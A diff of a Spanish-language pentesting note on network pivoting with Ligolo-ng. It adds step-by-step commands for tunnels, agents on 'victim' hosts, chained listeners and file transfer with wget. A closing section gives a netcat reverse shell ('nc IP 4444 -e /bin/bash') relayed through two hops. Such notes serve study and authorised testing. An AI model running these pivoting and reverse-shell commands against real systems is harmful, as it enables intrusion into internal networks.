@@ -2,57 +2,118 @@
 
 Tags: #Pivoting #Ligolo 
 
+## Ejemplo de red 
+
+![[Ligolo.png | 800]]
+
+## Conectar agente y proxy 
+
 * [Ligolo-ng](https://github.com/nicocha30/ligolo-ng/releases)
+
+### Conectar un agente (Del Punto B al Punto A)
 
 ```bash 
 # Descargar agente y proxy 
+NOTA: Cada vez que se quiera llegar a una red, se tiene que crear una nueva interfaz de red
 
-1. Crear una interface de red llamada 'ligolo' en modo tunel en Kali
-❯ ip tuntap add $USER mode tun ligolo    
+
+PASO 1:
+❯ ip tuntap add user $USER mode tun ligolo       # Crear una interface de red llamada 'ligolo' en modo tunel en Kali
 ❯ ip link set ligolo up 
-❯ ip route add IP.0/24 dev ligolo    # Agregar el segmento al cual se quiere llegar 
+❯ ip route add IP.0/24 dev ligolo                # Agregar el segmento al cual se quiere llegar 
 	# dev = Dispositivo llamado 'ligolo'
 
 
-2. Activar el proxy en Kali 
-❯ ./proxy -selfcert     # Ejecutar el proxy en Kali con permisos de ejecución
+PASO 2: 
+❯ ./proxy -selfcert           # Ejecutar el proxy en Kali con permisos de ejecución
 
 
-3. Activar el agente en la maquina victima 'salto' en el dir '/tmp'
-❯ ./agent -connect IP:Port -ignore-cert    # Ejecutar el agente en la maquina victima con permisos de ejecución
+PASO 3: 
+❯ chmod +x agent   # Permisos de ejecución 
+❯ ./agent -connect IP_Kali:11601 -ignore-cert       # Ejecutar el agente en la máquina víctima en el 'salto' con permisos de ejecución en el dir '/tmp'
 	# IP = Direción IP de Kali
 	# Port = Puerto en donde esta escuchando ligolo al ejecutar el proxy 
 
 
-4. Una vez que la maquina Kali muestre 'Agent join' dar 'Enter' para ingresar a la consola interactivade ligolo
-❯ session         # Mostrar las sesiones activas y dar 'Enter' para seleccionar la sesión 
+PASO 4:
+# Una vez que en Kali muestre 'Agent join', dar 'Enter' para ingresar a la consola interactivade ligolo
+❯ session         # Mostrar las sesiones activas, seleccionar la sesión 1 y dar 'Enter'
 ❯ start           # Iniciar el tunelizado al segmento de red 
-❯ listener_add --add 0.0.0.0:8080 --to 127.0.0.1:80   # Todo el tráfico que reciba la máquina de salto por el puerto 8080 lo redirigirá al localhost de Kali por el puerto 80
-❯ listener_list   # Mirar los 'listeners' activos 
-❯ listener_add --add 0.0.0.0:4443 --to 127.0.0.1:443   # Agregar diferentes puertos para las diferentes conexiones. Si no eres un usuario root debes de agregar puertos arriba del numero 1000
 
-5. Al terminar se debe limpiar 
+```
+
+```bash 
+PASO EXTRA: 
+
+# Al terminar eliminar las rutas y la interfaz 'ligolo' en Kali 
 ❯ ip route del IP.0/24 dev ligolo    # Eliminar la ruta de la tabla de ruteo 
 ❯ ip link del ligolo                 # Eliminar la interface llamada 'ligolo'
 ❯ ip route list                      # Mirar la tabla de enrutamiento 
 ```
 
-## Compartir un archivo 
+### Conectar más agentes (Del Punto C  al Punto A)
 
 ```bash 
-# Para pasar un archivo desde una segunda maquina victima la cual pertenece al segmento de red no directo a la maquina Kali se hace lo siguiente:
+# Esto funciona cuando ya se tiene un primer túnel y se quiere crear un segundo túnel 
 
-❯ wget http://IP:8080/file.txt    # Ejecutar 'Wget' en la segunda maquina víctima y colocar la IP de la primer maquina víctima 'salto' en lugar de la IP de la maquina de Kali. Esto funcionará por el 'listener' que se ha configurado. 
 
-❯ python3 -m http.server 80       # Compartir el archivo desde Kali por el puerto 80  
+PASO 1:
+❯ ip tuntap add user $USER mode tun ligolo2       # Crear una interface de red llamada 'ligolo2' en modo tunel en Kali
+❯ ip link set ligolo2 up 
+❯ ip route add IP.0/24 dev ligolo2                # Agregar el segmento al cual se quiere llegar 
+	# dev = Dispositivo llamado 'ligolo2'
+
+
+PASO 2: 
+# Configuración en la interfaz de ligolo siempre a la máquina mas cercana
+❯ listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80 --tcp         # Todo el tráfico que reciba la máquina de salto por el puerto 8080 lo redirigirá al localhost de Kali por el puerto 80
+❯ listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp     # Todo el tráfico que reciba la máquina de salto por el puerto 11601 lo redirigirá al localhost de Kali por el puerto 11601
+❯ listener_list     # Mirar las conexiones 
+
+
+PASO 3:
+# Para descargar el agente desde una segunda máquina víctima la cual pertenece al segmento de red no directo a Kali, se hace lo siguiente:
+❯ wget http://IP_Vic1:8080/agent       # Ejecutar 'Wget' en la segunda máquina víctima y colocar la IP de la primer maquina víctima 'salto' en lugar de la IP de la maquina de Kali. Esto funcionará por el 'listener' que se ha configurado 
+❯ python3 -m http.server 80            # Compartir el agente desde Kali por el puerto 80  
+
+
+PASO 4: 
+❯ chmod +x agent   # Permisos de ejecución 
+❯ ./agent -connect IP_Vic1:11601 -ignore-cert       # Ejecutar el agente en la segunda máquina víctima
+	# IP = Direción IP de la primer máquina víctima (Primer salto)
+	# Port = Puerto en donde esta escuchando ligolo al ejecutar el proxy 
+
+
+PASO 5:
+# Una vez que en Kali muestre 'Agent join', dar 'Enter' para ingresar a la consola interactivade ligolo
+❯ session                 # Mostrar las sesiones activas, seleccionar la sesión 2 y dar 'Enter'
+❯ start --tun ligolo2     # Iniciar el tunelizado al segundo segmento de red especificando la interfaz
 ```
 
-## Hacer una Revershell 
+## Eliminar agente en Windows 
+
+```powershell 
+❯ tasklist | findstr agent          # Saber si un agente se esta ejecutando en Windows 
+❯ taskkill /f /im agent_win.exe     # Eliminar todas las sesiones de los agentes en Windows 
+```
+
+## Hacer una Reverse Shell 
 
 ```bash 
-# Para crear una revershell desde una segunda maquina victima la cual pertenece al segmento de red no directo a la maquina Kali se hace lo siguiente: 
+# Para crear una revershell desde una tercer máquina víctima la cual pertenece al segmento de red no directo a la maquina Kali se hace lo siguiente: 
 
-❯ nc IP 4443 -e /bin/bash   # Ejecutar 'Netcat' en la segunda maquina víctima y colocar la IP de la primer maquina víctima 'salto' en lugar de la IP de la maquina de Kali. Esto funcionará por el 'listener' que se ha configurado.  
 
-❯ nc -nlvp 443  # Colocarse en escucha en Kali para recibir la revershell por el puerto 80 
+PASO 1: 
+# Agregar los puertos para compartir el archivo y para la conexión de la revershell  
+❯ session                 # Seleccionar la sesión mas lejana, en este caso la sesión 2 
+❯ listener_add --addr 0.0.0.0:4444 --to IP_Vic2:4444 --tcp         # Todo el tráfico que reciba la máquina de salto por el puerto 4444 lo redirigirá al localhost de Kali por el puerto 4444
+❯ listener_add --addr 0.0.0.0:8080 --to IP_Vic2:8080 --tcp
+❯ session                 # Seleccionar la sesión 1
+❯ listener_add --addr 0.0.0.0:4444 --to IP_Vic1:4444 --tcp 
+
+
+PASO 2:
+❯ nc IP 4444 -e /bin/bash   # Ejecutar 'Netcat' en la tercer máquina víctima y colocar la IP de la segunda maquina víctima 'salto' en lugar de la IP de la maquina de Kali. Esto funcionará por el 'listener' que se ha configurado.  
+❯ nc -nlvp 4444             # Colocarse en escucha en Kali para recibir la revershell por el puerto 4444 
 ```
+
